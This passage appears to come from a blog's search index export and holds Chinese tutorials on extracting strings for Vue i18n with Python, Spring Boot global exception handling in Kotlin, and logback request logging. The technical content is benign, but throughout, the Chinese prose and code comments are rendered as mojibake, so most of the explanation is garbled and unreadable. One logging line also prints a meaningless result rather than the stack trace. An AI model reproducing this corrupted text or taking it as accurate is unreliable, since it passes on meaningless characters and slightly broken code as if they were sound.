= file.readline() while line: text_list = text_split_list(match_rule, exclude_rule, line) if not text_list: pass else: for text in text_list: out_file.write(text + '\n') line = file.readline() file.close() out_file.close()# æ ¹æ®è§„åˆ™æŸ¥æ‰¾å‡ºç›®æ ‡æ–‡å­—ï¼Œè¿”å›žæ•°ç»„def text_split_list(match_rule, exclude_rule, text_str): for exr in exclude_rule: text_str = re.sub(exr, "", text_str) array_list = match_rule.split(text_str) while '' in array_list: array_list.remove('') return array_list# æ ¹æ®ä½ çš„å®žé™…æƒ…å†µif __name__ == '__main__': # è¦åŒ¹é…çš„æ–‡ä»¶è·¯å¾„å’Œæ–‡ä»¶åŽç¼€ file_input_path = '/Users/lanshiqin/Temp/vue-demo' file_input_list = get_file_path_list(file_input_path, '.html') # è¦åŒ¹é…çš„è§„åˆ™ match_re = re.compile('[^\u4E00-\u9FA5]') # è¦æŽ’é™¤çš„è§„åˆ™æ•°ç»„ æŽ’é™¤htmlä¸­çš„&lt;!-- å’Œ // æ³¨é‡Š exclude_re = [r'&lt;!--.*$', r'//.*$'] # åŒ¹é…åˆ°çš„å€¼è¦è¾“å‡ºåˆ°çš„æŒ‡å®šæ–‡ä»¶ file_out_path = '/Users/lanshiqin/Desktop/zh_cn.txt' # åŒ¹é…è¾“å‡º read_file_match_out(match_re, exclude_re, file_input_list, file_out_path) ç¬¬äºŒæ­¥ï¼šç”Ÿæˆéœ€è¦ç¿»è¯‘çš„å¤šè¯­ç§jsæ–‡ä»¶ GenerateUtils.py1234567891011121314151617181920212223# ç”Ÿæˆå¤šè¯­è¨€jsæ–‡ä»¶def generate_language_js_files(file_input, file_output_list): for file_output in file_output_list: file_out = open(file_output + '.js', 'w') file_out.write('const ' + file_output + ' = &#123;\n') file = open(file_input, 'r') line = file.readline() while line: line = line.replace("\n", "") print(line) file_out.write("\t" + line + ": '" + line + "',\n") line = file.readline() file_out.write("&#125;") file.close() file_out.close()if __name__ == '__main__': # ç¬¬ä¸€æ­¥æ‰¾åˆ°çš„ç®€ä½“ä¸­æ–‡ input_file = '/Users/lanshiqin/Desktop/zh_cn.txt' # è¦è¾“å‡ºçš„ç›®æ ‡è¯­ç§æ–‡ä»¶æ–‡ä»¶ output_file_list = ['cn', 'en'] # ç”Ÿæˆå¤šè¯­è¨€ç›®æ ‡æ–‡ä»¶ generate_language_js_files(input_file, output_file_list) ç¬¬ä¸‰æ­¥ï¼šæ›¿æ¢htmlä¸­çš„ä¸­æ–‡ä¸ºVueI18næ¨¡æ¿è¡¨è¾¾å¼ï¼Œå…¶ä¸­çš„é”®ä¸ºè¯­ç§æ–‡ä»¶çš„å˜é‡123456789101112131415161718192021222324252627282930313233343536373839# æŒ‰è¡Œè¯»å–æ–‡ä»¶å†…å®¹è½¬æ¢æˆæ•°ç»„def read_file_to_list(file_input): file = open(file_input, 'r') line = file.readline() file_list = [] while line: line = line.replace('\n', '') file_list.append(line) line = file.readline() return file_list# æ ¹æ®ä¸­æ–‡é”®åç§°æ›¿æ¢ç›®æ ‡æ–‡ä»¶é›†åˆä¸­çš„ä¸­æ–‡ä¸ºVueI18nçš„æ¨¡æ¿è¡¨è¾¾å¼def replace_I18n_template(key_list, file_path_list): for file_obj in file_path_list: file_obj_temp = '' for key in key_list: file = open(file_obj, 'r') line = file.readline() while line: line = line.replace(key, '&#123;&#123; $t("' + key + '") &#125;&#125;') file_obj_temp += line line = file.readline() file.close() file_write = open(file_obj, 'w') file_write.write(file_obj_temp) file_obj_temp = '' file_write.close()# æ ¹æ®ä½ çš„å®žé™…æƒ…å†µif __name__ == '__main__': # è¯»å–æŒ‡å®šæ–‡ä»¶åŒ…è£…æˆæ•°ç»„ input_file = '/Users/lanshiqin/Desktop/zh_cn.txt' file_key_list = read_file_to_list(input_file) # è¦åŒ¹é…çš„æ–‡ä»¶è·¯å¾„å’Œæ–‡ä»¶åŽç¼€ file_input_path = '/Users/lanshiqin/Temp/vue-demo' file_input_list = get_file_path_list(file_input_path, '.html') # å¯¹åŒ¹é…çš„æ–‡ä»¶è¿›è¡ŒVueI18næ¨¡æ¿è¡¨è¾¾å¼æ›¿æ¢ replace_I18n_template(file_key_list, file_input_list) è¿™æ ·ä¸€ä¸ªä¼ ç»Ÿçš„Vueæž„å»ºçš„å‰ç«¯æœ¬åœ°åŒ–å·¥ç¨‹ï¼Œå°±å¯ä»¥å®žçŽ°ä¸€ç§’é’Ÿå®Œæˆå›½é™…åŒ–çš„æ“ä½œã€‚å¦‚æžœè§‰å¾—å¤šè¯­è¨€æ–‡ä»¶ä¸­çš„é”®é‡‡ç”¨ä¸­æ–‡æœ‰ä¸å¦¥ï¼Œå¯ä»¥ç»§ç»­é‡‡ç”¨åŒ¹é…æ–¹æ¡ˆï¼Œå°†æ‰€æœ‰çš„é”®éƒ½æ‰¹é‡é‡å‘½åã€‚é»˜è®¤é‡‡ç”¨ä¸­æ–‡ä½œä¸ºé”®ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯é«˜æ•ˆï¼Œç²¾ç¡®ï¼ŒèŠ‚çœæ—¶é—´ã€‚æˆ‘çš„è€ƒè™‘æ˜¯ï¼šé‡‡ç”¨å¼€å‘è€…åŽŸç”Ÿè¯­è¨€ä½œä¸ºé”®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ¬åœŸåŒ–çš„äººéƒ½è®¤è¯†çš„è¯­è¨€ï¼Œç„¶åŽå°†å¯¹åº”çš„è¯­è¨€æ–‡ä»¶äº¤ç»™æŽŒæ¡æœ¬åœŸåŒ–è¯­è¨€å¹¶ä¸”æŽŒæ¡ç›®æ ‡è¦ç¿»è¯‘è¯­è¨€çš„è¿™æ ·ä¸€ä¸ªäººï¼Œè¿™æ ·ä»–å°±èƒ½å¤Ÿç²¾ç¡®é«˜æ•ˆçš„ç¿»è¯‘ï¼Œç¿»è¯‘åŽçš„æ–‡ä»¶ä¹Ÿæ˜¯ç¨‹åºå¯ç›´æŽ¥ä½¿ç”¨çš„ã€‚ å¼€å‘è€…æ— éœ€å…³ç³»é”®åå’Œé”®å€¼ï¼Œå¦‚æžœæ¯”è¾ƒå¼ºè¿«ç—‡ï¼ŒæŸä¸€å¤©çªç„¶æƒ³å¥½äº†è¿™ä¸ªé”®è¦å–ä»€ä¹ˆåå­—ï¼Œå¯ä»¥è¿›è¡ŒåŒ¹é…æ›¿æ¢æ“ä½œã€‚è¿™é‡Œä»…ä»…é’ˆå¯¹ä¼ ç»Ÿå¼€å‘çš„Vueè¿›è¡ŒI18nçš„æ”¯æŒï¼Œå¦‚æžœéœ€è¦ç¿»è¯‘Android Appçš„å¤šè¯­è¨€æ–‡ä»¶ï¼Œæˆ–è€…å…¶ä»–ç±»ä¼¼å¹³å°çš„å¤šè¯­è¨€æ–‡ä»¶æ—¶ï¼Œè¿™äº›å¹³å°å¯èƒ½ä¸èƒ½ä½¿ç”¨ä¸­æ–‡ä½œä¸ºé”®ï¼Œä¸­æ–‡ä½œä¸ºé”®å¯ä»¥è®¤ä¸ºæ˜¯ä¸€ä¸ªä¸­é—´è¿‡ç¨‹ï¼Œç­‰ç¿»è¯‘å·¥ä½œå…¨éƒ¨å®ŒæˆåŽï¼Œå†å†™ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬è‡ªåŠ¨æ‰¹é‡æ›¿æ¢æƒ³å¥½çš„é”®å³å¯ã€‚ ä¸€é”®å›½é™…åŒ–æ¼”ç¤º ä¸ºäº†æ“ä½œæ–¹ä¾¿ï¼Œæˆ‘æŠŠ3ä¸ªpythonæ–‡ä»¶çš„ä»£ç éƒ½æ”¾åœ¨ä¸€ä¸ªvue_language_global.py æ–‡ä»¶ä¸­äº†githubåœ°å€ï¼šhttps://github.com/lanshiqin/VueLanguageUtilsæ¬¢è¿Ž Star&amp;Fork æ€»ç»“å¦‚æžœæ¶‰åŠåˆ°è‹±è¯­ä»¥åŠå…¶ä»–å¤–è¯­ï¼Œå•çº¯çš„å›½é™…åŒ–æ”¯æŒå…¶å®žæ˜¯ä¸å¤Ÿçš„ï¼Œé™¤äº†ä¸èƒ½ç”¨æœºå™¨ç¿»è¯‘å¤–ï¼Œè¿˜éœ€è¦è€ƒè™‘æ¯ä¸ªå­—è¯å¯¹åº”çš„ç¿»è¯‘å†…å®¹é•¿åº¦ï¼ŒåŽŸå…ˆçš„UIè®¾è®¡å’Œäº¤äº’å¯èƒ½å°±éœ€è¦æ”¹å˜ï¼Œå› æ­¤è¯­è¨€è·¨åº¦æ¯”è¾ƒå¤§çš„å›½é™…åŒ–ï¼Œä¸€èˆ¬ä¼šå•ç‹¬åšä¸€ä¸ªç‰ˆæœ¬ã€‚ æœ¬æ¬¡é‡åˆ°çš„éœ€æ±‚å…¶å®žæ˜¯éœ€è¦æ”¯æŒç¹ä½“ä¸­æ–‡ï¼Œæ¯ä¸ªæ±‰å­—å¯¹åº”ä¸€ä¸ªç¹ä½“å­—ï¼Œä¸æ¶‰åŠè¯­æ³•ä»¥åŠè¯åºçš„é—®é¢˜ã€‚æ‰€ä»¥è¿™æ­¥ç¿»è¯‘æ“ä½œå¯ä»¥é‡‡ç”¨è°ƒç”¨apiçš„æ–¹å¼å®Œæˆè‡ªåŠ¨åŒ–ç¿»è¯‘ç”Ÿæˆæ–‡ä»¶ã€‚]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…¨å±€å¼‚å¸¸å¤„ç†æœºåˆ¶]]></title>
    <url>%2F7545587%2F</url>
    <content type="text"><![CDATA[å¼‚å¸¸å¤„ç†æœºåˆ¶åœ¨åŽç«¯å¼€å‘ä¸­èµ·ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚åœ¨JavaåŽç«¯å¼€å‘ä¸­ï¼ŒServiceå±‚ä¸€èˆ¬ç”¨æ¥åšä¸šåŠ¡é€»è¾‘å±‚ï¼Œè¿™ä¸€å±‚æ‰€å‡ºçŽ°çš„å’Œä¸šåŠ¡æ— å…³çš„å¼‚å¸¸ï¼Œåº”å½“å¾€ä¸Šä¸€å±‚æŠ›å‡ºï¼Œæœ€ç»ˆåœ¨Controllerå±‚å¤„ç†æ‰€æœ‰çš„å¼‚å¸¸ï¼Œæ‰€ä»¥è¦å®šåˆ¶ä¸€å¥—å®Œæˆçš„å¼‚å¸¸å¤„ç†æ–¹æ¡ˆï¼Œé’ˆå¯¹ä¸åŒçš„å¼‚å¸¸åšä¸åŒçš„å¤„ç†ã€‚ é’ˆå¯¹ä¸šåŠ¡å±‚çš„ä¸åŒå¼‚å¸¸ï¼Œè¦åšå„è‡ªçš„å¤„ç†å¹¶åˆç†è¿”å›žï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†è¯´æ˜Žï¼Œä¸»è¦è®°å½•ä¸€ä¸‹å…¨å±€å¼‚å¸¸çš„æ•èŽ·å’Œå¤„ç†ã€‚ Spring Bootä¸­é»˜è®¤å¯¹å…¨å±€å¼‚å¸¸åšäº†å¤„ç†,ç”¨æµè§ˆå™¨è®¿é—®ä¸€ä¸ªå¼‚å¸¸æŽ¥å£æ—¶ï¼Œä¼šè¿”å›žä¸€ä¸ªerroré¡µé¢ï¼Œå¹¶ä¸”æŠŠå¼‚å¸¸ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ã€‚å½“ç”¨PostManç­‰å·¥å…·è¿›è¡ŒAPIè¯·æ±‚çš„æ–¹å¼è®¿é—®å¼‚å¸¸çš„æŽ¥å£æ—¶ï¼Œä¼šè¿”å›žä¸€ä¸ªjsonæ•°æ®ã€‚1234567&#123; "timestamp": "2018-09-09T03:52:05.850+0000", "status": 404, "error": "Not Found", "message": "å¼‚å¸¸ä¿¡æ¯", "path": "/xxxPath"&#125; åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåº”è¯¥ä¸ºä¸åŒçš„è®¾å¤‡è®¿é—®æ–¹å¼è¿”å›žç›¸åŒæ ¼å¼çš„ä¿¡æ¯ï¼Œè¿™é‡Œçš„jsonæ ¼å¼å­—æ®µå¯èƒ½å¹¶ä¸æ˜¯ä¸šåŠ¡æ‰€éœ€è¦çš„ã€‚åœ¨å®žé™…ä¸šåŠ¡ä¸­ï¼Œå½“æœåŠ¡è°ƒç”¨å‡ºçŽ°å¼‚å¸¸æ—¶ï¼Œåº”è¯¥ä¸ºè°ƒç”¨è€…è¿”å›žçº¦å®šå¥½çš„ä¸Žä¸šåŠ¡ç›¸å…³çš„æ•°æ®æ¨¡åž‹ã€‚æ¯”å¦‚Controllerå±‚åœ¨å¤„ç†æ•èŽ·åˆ°çš„å¼‚å¸¸åŽå¯ä»¥å‘å¤–æŠ›å‡ºä¸€ä¸ªApiExceptionï¼Œç”¨æ¥è¡¨ç¤ºä¸Žä¸šåŠ¡æ— å…³çš„å…¨å±€å¼‚å¸¸ã€‚æ–°å»ºApiExceptionç±»ç»§æ‰¿Exception12345678package com.lanshiqin.apiboot.controller.exception/** * APIå¼‚å¸¸ç±» * ç”¨æ¥æ ‡æ³¨Controllerè°ƒç”¨çš„é€šç”¨å¼‚å¸¸ * @author è“å£«é’¦ */class ApiException(message: String?) : Exception(message) æ–°å»ºå…¨å±€å¼‚å¸¸å¤„ç†ç±» GlobalExceptionHandler1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.lanshiqin.apiboot.controller.handlerimport com.lanshiqin.apiboot.controller.exception.ApiExceptionimport com.lanshiqin.apiboot.model.ErrorInfoimport org.slf4j.LoggerFactoryimport org.springframework.web.bind.annotation.ControllerAdviceimport org.springframework.web.bind.annotation.ExceptionHandlerimport org.springframework.web.bind.annotation.ResponseBodyimport org.springframework.web.servlet.ModelAndViewimport javax.servlet.http.HttpServletRequest/** * å…¨å±€å¼‚å¸¸å¤„ç† * @author è“å£«é’¦ */@ControllerAdviceclass GlobalExceptionHandler&#123; /** * ç»Ÿä¸€å¼‚å¸¸å¤„ç†æ–¹æ³• * æ‰“å°å¼‚å¸¸æ—¥å¿—ï¼Œå¹¶å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šçš„é¡µé¢ * @ httpServletRequest è¯·æ±‚å¯¹è±¡ * @ exception å¼‚å¸¸ä¿¡æ¯ */ @ExceptionHandler(value = [Exception::class]) fun defaultExceptionHandler(httpServletRequest: HttpServletRequest, exception: Exception): ModelAndView&#123; logger.error("å…¨å±€å¼‚å¸¸: "+exception.printStackTrace().toString()) val modelAndView = ModelAndView() modelAndView.addObject("exception",exception) modelAndView.addObject("url",httpServletRequest.requestURL) modelAndView.viewName = DEFAULT_EXCEPTION_PAGE return modelAndView &#125; /** * APIå¼‚å¸¸å¤„ç†æ–¹æ³• * @ httpServletRequest è¯·æ±‚å¯¹è±¡ * @ exception å¼‚å¸¸ä¿¡æ¯ */ @ResponseBody @ExceptionHandler(value = [ApiException::class]) fun apiExceptionHandler(httpServletRequest: HttpServletRequest, exception: Exception): ErrorInfo&lt;String&gt; &#123; logger.error("APIå¼‚å¸¸: "+exception.printStackTrace().toString()) val errorInfo: ErrorInfo&lt;String&gt; = ErrorInfo() errorInfo.code=500 errorInfo.message=exception.message errorInfo.data="APIå¼‚å¸¸" return errorInfo &#125; companion object &#123; const val DEFAULT_EXCEPTION_PAGE = "exception" val logger = LoggerFactory.getLogger(GlobalExceptionHandler::class.java)!! &#125;&#125; å¤„ç†å¼‚å¸¸çš„æ–¹æ³•ä¸Šéœ€è¦æ·»åŠ @ExceptionHandleræ³¨è§£ï¼Œvalueå€¼æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨æ¥å£°æ˜Žè¿™ä¸ªæ–¹æ³•è¦å¤„ç†å“ªäº›å¼‚å¸¸ã€‚å½“å¼‚å¸¸åŒ¹é…æ–¹æ³•æ—¶æ‰ä¼šè¿›å…¥æ–¹æ³•ä½“æ‰§è¡Œç›¸åº”çš„é€»è¾‘ã€‚ åœ¨resources/templateä¸‹æ–°å»ºé¡µé¢ exception.html123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;ç»Ÿä¸€å¼‚å¸¸å¤„ç†&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;å‘ç”Ÿå¼‚å¸¸&lt;/h1&gt; &lt;div th:text="$&#123;url&#125;"&gt;&lt;/div&gt; &lt;div th:text="$&#123;exception.message&#125;"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒSpringBootæœ‰å‡ ä¸ªå¯é€‰çš„è§†å›¾æ¨¡æ¿å¼•æ“Žï¼Œè™½ç„¶åšäº†é»˜è®¤é…ç½®çš„ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦åœ¨Gradleä¸­å¼•ç”¨ä¾èµ–,å¦åˆ™æ— æ³•æ­£å¸¸è§£æžæŒ‡å®šçš„æ¨¡æ¿é¡µé¢1compile('org.springframework.boot:spring-boot-starter-thymeleaf') åœ¨å…¨å±€å¼‚å¸¸å¤„ç†ç±»ä¸­ï¼Œå®šä¹‰äº†ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªç”¨æ¥å¤„ç†æœªæ•èŽ·çš„å¼‚å¸¸ï¼Œå¹¶ä¸”è¿”å›žhtmlé¡µé¢è¿›è¡Œæ˜¾ç¤ºã€‚åœ¨APIåŽç«¯æŽ¥å£æœåŠ¡å¼€å‘ä¸­ï¼Œåº”å½“åœ¨Controllerå±‚å¤„ç†æŽ‰æ‰€æœ‰å¼‚å¸¸ï¼Œæ‰€ä»¥ä»¥éžjsonæ¥è¾“å‡ºè¿™ä¸ªé¡µé¢ä¸€æ–¹é¢æ˜¯ç”¨æ¥æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œå¦ä¸€æ–¹é¢æ˜¯ç”¨æ¥è¯´æ˜ŽAPIæŽ¥å£å†™çš„æœ‰é—®é¢˜ã€‚å®¢æˆ·ç«¯åœ¨APIè¯·æ±‚æ—¶å¦‚æžœæŽ¥å—åˆ°è¿™æ ·çš„htmlï¼Œä¼šæ— æ³•è§£æžæŒ‰ç…§çº¦å®šçš„jsonæ ¼å¼ã€‚è¿™ä¸ªå¼‚å¸¸é¡µé¢ç”¨æ¥æç¤ºåŽç«¯å¼€å‘äººå‘˜åº”å½“åœ¨Controllerå±‚å¤„ç†æŽ‰å¼‚å¸¸ï¼ŒæŠ›å‡ºApiExceptionã€‚ ä¸€ä¸ªç›¸å¯¹æ­£ç¡®çš„APIæŽ¥å£ï¼ŒControllerç¤ºä¾‹å¦‚ä¸‹12345678910111213141516171819202122232425262728/** * ç”¨æˆ·ä¿¡æ¯Controller * @author è“å£«é’¦ */@RestControllerclass UserInfoController&#123; /** * ç”¨æˆ·ä¿¡æ¯Service */ @Autowired val userInfoService: UserInfoService?=null /** * æ·»åŠ ç”¨æˆ·ä¿¡æ¯ */ @PutMapping("/addUserInfo") fun addUserInfo(@RequestBody userInfo: UserInfo): Any&#123; return try &#123; userInfoService!!.saveUserInfo(userInfo) &#125;catch (e: Exception)&#123; // æ•èŽ·å¹¶å¤„ç†å¼‚å¸¸ // ... // æŠ›å‡ºApiException throw ApiException(e.message) &#125; &#125;&#125; Controllerä¸€å®šè¦æ•èŽ·å¹¶ä¸”å¤„ç†æŽ‰æ‰€æœ‰å¼‚å¸¸ï¼Œç„¶åŽå‘å¤–è¿”å›žä¸€ä¸ªçº¦å®šå¥½çš„å¤„ç†å¤±è´¥çš„ä¿¡æ¯æ ¼å¼ã€‚è¿™é‡Œæœ€åŽæŠ›å‡ºApiExceptionï¼Œå…¨å±€å¼‚å¸¸å¤„ç†ç±»ä¸­ä¼šæ‹¦æˆªåˆ°è¿™ä¸ªå¼‚å¸¸å¹¶ä¸”åšå¼‚å¸¸æ—¥å¿—è®°å½•ï¼Œè¿”å›žå¼‚å¸¸ä¿¡æ¯ç»™è°ƒç”¨è€…ã€‚ æ³¨ï¼šä¸šåŠ¡å±‚æ•èŽ·åˆ°è‡ªå·±ä¸šåŠ¡èŒƒå›´å†…çš„å¼‚å¸¸æ—¶è¦è‡ªå·±å¤„ç†æŽ‰ï¼Œå¹¶ä¸”æ ¹æ®æƒ…å†µç»ˆæ­¢ä¸šåŠ¡ï¼ŒæŠŠå¼‚å¸¸çŠ¶æ€è¿”å›žç»™è°ƒç”¨è€…å‘ŠçŸ¥å¼‚å¸¸ã€‚ä¸šåŠ¡å±‚ä¸åº”è¯¥å¤„ç†æŽ‰ä¸å±žäºŽè‡ªå·±ä¸šåŠ¡èŒƒå›´çš„å¼‚å¸¸ï¼Œæ¯”å¦‚Exceptionç­‰ï¼Œè€Œæ˜¯åº”è¯¥å¾€ä¸ŠæŠ›å‡ºç»™Controllerï¼Œè®©Controlleræ¥å¤„ç†ã€‚Controllerå¤„ç†æŽ‰ServiceæŠ›å‡ºçš„å¼‚å¸¸ï¼Œè¦å¤„ç†æŽ‰å¹¶ä¸”è¿”å›žçº¦å®šå¥½çš„å¼‚å¸¸å¯¹è±¡æ ¼å¼ç»™è°ƒç”¨è€…ï¼Œè®°å½•å…¨å±€å¼‚å¸¸æ—¥å¿—ã€‚]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[logbackæ—¥å¿—ç³»ç»Ÿé…ç½®]]></title>
    <url>%2Fa6a1e8bd%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åœ¨ä½¿ç”¨SpringBootæ­å»ºä¸€ä¸ªé€šç”¨çš„APIå¼€å‘æ¡†æž¶ï¼Œä¸»è¦è®°å½•åœ¨APIæ¡†æž¶æ­å»ºè¿‡ç¨‹ä¸­çš„ä¸€äº›å­¦ä¹ ç¬”è®°ã€‚æˆ‘è®¤ä¸ºåœ¨APIæ¡†æž¶ä¸­æœ€åŸºç¡€ä¹Ÿæ˜¯æœ€é‡è¦çš„éƒ¨åˆ†æ˜¯ï¼šæ—¥å¿—ç³»ç»Ÿã€å¼‚å¸¸æœºåˆ¶ã€äº‹åŠ¡æŽ§åˆ¶ã€‚å…¶ä¸­æ—¥å¿—ç³»ç»Ÿæ˜¯æœ€åŸºç¡€çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œå¯¹äºŽåŽç«¯ç³»ç»Ÿæ¥è¯´ï¼Œéœ€è¦è®°å½•æ‰€æœ‰çš„è¯·æ±‚ã€æ“ä½œæ—¥å¿—ã€å¼‚å¸¸è¾“å‡ºç­‰å„ç§ä¿¡æ¯ï¼Œä½¿å¾—å¼€å‘äººå‘˜åœ¨ç³»ç»Ÿå‡ºçŽ°é—®é¢˜æ—¶èƒ½å¤Ÿæœ‰æ®å¯ä¾ï¼Œå¿«é€Ÿå®šä½å¹¶æ‰¾å‡ºé—®é¢˜æ‰€åœ¨ã€‚Spring Bootå†…ç½®äº†slf4j(Simple Logging Facade for Java)æ—¥å¿—APIå’Œå…·ä½“çš„æ—¥å¿—å®žçŽ°logbackã€‚å¯ä»¥å°†logbackæ›¿æ¢æˆLog4jæˆ–è€…å…¶ä»–æ—¥å¿—æ¡†æž¶ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æŽ¨èä½¿ç”¨é»˜è®¤çš„logbackï¼Œå› ä¸ºå®ƒæ˜¯Log4jçš„ä½œè€…æ–°å¼€æºçš„æ—¥å¿—æ¡†æž¶ã€‚ åœ¨Spring Bootä¸­å¯ç”¨logbackè®°å½•æ—¥å¿—ï¼šåªéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®è¾“å‡ºç›®å½•å³å¯:application.yml123456# æ—¥å¿—é…ç½®logging: # æ—¥å¿—æ–‡ä»¶è·¯å¾„ path: log # æ—¥å¿—æ–‡ä»¶åç§°(å¯é€‰ï¼Œé»˜è®¤ä¸ºspringï¼Œè¾“å‡ºçš„æ—¥å¿—æ–‡ä»¶åä¸ºspring.log) file: app å¯åŠ¨é¡¹ç›®åŽï¼ŒæŽ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—å°†ä¼šè¢«å†™å…¥åˆ°å½“å‰é¡¹ç›®çš„logæ–‡ä»¶å¤¹ä¸‹çš„spring.logæ–‡ä»¶ä¸­ã€‚ åœ¨å¤§å¤šæ•°åœºæ™¯ä¸‹ï¼Œä¸€èˆ¬å¸Œæœ›æ—¥å¿—èƒ½å¤Ÿè®°å½•å®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚çš„urlï¼Œè¯·æ±‚æ–¹å¼ï¼Œipåœ°å€ç­‰ä¿¡æ¯ï¼Œç”¨äºŽåŽç»­çš„æ•°æ®ç»Ÿè®¡å’Œåˆ†æžã€‚ æ–°å»ºæ—¥å¿—æ‹¦æˆªå™¨ç±»LoggerInterceptorç»§æ‰¿è‡ªHandlerInterceptoræŽ¥å£å¹¶å®žçŽ°preHandleæ–¹æ³•123456789101112131415161718192021222324package com.lanshiqin.apiboot.controller.interceptorimport org.slf4j.LoggerFactoryimport org.springframework.stereotype.Componentimport org.springframework.web.servlet.HandlerInterceptorimport javax.servlet.http.HttpServletRequestimport javax.servlet.http.HttpServletResponse/** * æ—¥å¿—æ‹¦æˆªå™¨ * @author è“å£«é’¦ */@Componentclass LoggerInterceptor : HandlerInterceptor &#123; val logger = LoggerFactory.getLogger(LoggerInterceptor::class.java)!! override fun preHandle(request: HttpServletRequest, response: HttpServletResponse, handler: Any): Boolean &#123; logger.info("IP:$&#123;request.remoteAddr&#125; METHOD:$&#123;request.method&#125; UR:$&#123;request.requestURL&#125;") return super.preHandle(request, response, handler) &#125;&#125; æ–°å»ºæ‹¦æˆªå™¨é…ç½®ç±»InterceptorConfigAdapterç»§æ‰¿è‡ªWebMvcConfigureræŽ¥å£å¹¶å®žçŽ°addInterceptorsæ–¹æ³•1234567891011121314151617181920212223242526package com.lanshiqin.apiboot.controller.configimport com.lanshiqin.apiboot.controller.interceptor.LoggerInterceptorimport org.springframework.beans.factory.annotation.Autowiredimport org.springframework.context.annotation.Configurationimport org.springframework.web.servlet.config.annotation.InterceptorRegistryimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer/** * æ‹¦æˆªå™¨é…ç½® * @author è“å£«é’¦ */@Configurationclass InterceptorConfigAdapter : WebMvcConfigurer&#123; // ä¾èµ–æ³¨å…¥æ—¥å¿—æ‹¦æˆªå™¨ @Autowired val loggerInterceptor: LoggerInterceptor ? = null override fun addInterceptors(registry: InterceptorRegistry) &#123; // æ³¨å†Œæ—¥å¿—æ‹¦æˆªå™¨ï¼ŒæŒ‡å®šè¦æ‹¦æˆªçš„è·¯å¾„å’Œè¦æŽ’é™¤çš„è·¯å¾„ registry.addInterceptor(loggerInterceptor!!) .addPathPatterns("/**") .excludePathPatterns("/error","/doc.html") &#125;&#125; å¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€è¦æ·»åŠ ä»»æ„å¤šä¸ªæ‹¦æˆªå™¨ç±»ï¼Œå¹¶ä¸”åœ¨æ‹¦æˆªå™¨é…ç½®çš„addInterceptorsæ–¹æ³•ä¸­ï¼Œå°†æ³¨å…¥çš„æ‹¦æˆªå™¨æ³¨å†Œåˆ°ç³»ç»Ÿä¸­ã€‚addPathPatternsä¸ºè¿™ä¸ªæ‹¦æˆªå™¨è¦æ‹¦æˆªçš„åœ°å€ /**è¡¨ç¤ºæ‹¦æˆªæ‰€æœ‰åœ°å€ï¼Œé™¤äº†excludePathPatternsä¹‹å¤–çš„åœ°å€ã€‚excludePathPatternsä¸ºè¿™ä¸ªæ‹¦æˆªå™¨è¦æŽ’é™¤çš„åœ°å€ï¼Œè®¿é—®doc.htmlæ‰€åœ¨åœ°å€ï¼Œå‘çŽ°ä¸ä¼šè¿›å…¥æ—¥å¿—æ‹¦æˆªå™¨ï¼Œè¿™ä¸ªæŽ’é™¤å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚doc.htmlæ˜¯APIæ¡†æž¶çš„åœ¨çº¿è°ƒè¯•æ–‡æ¡£ï¼Œå¹¶ä¸éœ€è¦å°†è¯·æ±‚è®°å½•åˆ°æ—¥å¿—ä¸­ã€‚è¿˜å¯ä»¥å®žçŽ°ç™»å½•æ‹¦æˆªå™¨ï¼Œæ–¹ä¾¿ç›´è§‚çš„é…ç½®å“ªäº›æ˜¯éœ€è¦ç™»å½•æ‰èƒ½è®¿é—®çš„ï¼Œå“ªäº›æ˜¯ä¸éœ€è¦ç™»å½•å°±å¯ä»¥è®¿é—®çš„èµ„æºï¼Œé€šè¿‡æ‹¦æˆªå™¨é…ç½®å¯ä»¥ç›´è§‚æ¸…æ™°çš„ç½—åˆ—å‡ºæ¥ã€‚ è¿™é‡Œç”šè‡³çœ‹ä¸åˆ°logbackçš„é…ç½®ï¼Œå› ä¸ºSpringBooté™¤äº†é›†æˆlogbackï¼Œè¿˜å¯¹logbackåšäº†é»˜è®¤é…ç½®èƒ½å¤Ÿçœ‹åˆ°çš„å°±æ˜¯slf4jçš„apiæ“ä½œï¼Œä¹Ÿå°±æ˜¯ä»£ç ä¸­çš„è®°å½•æ—¥å¿—çš„è¯­å¥ã€‚123456789// é€šè¿‡slf4jæä¾›çš„æ–¹æ³•å¾—åˆ°loggerå¯¹è±¡val logger = LoggerFactory.getLogger(XXX::class.java)// é€šè¿‡slf4jçš„APIå®šä¹‰çš„æ–¹æ³•ï¼Œåœ¨ä»£ç ä¸­è¾“å‡ºä¸åŒçº§åˆ«çš„æ—¥å¿—logger.info()logger.warn()logger.debug()logger.trace()logger.error() 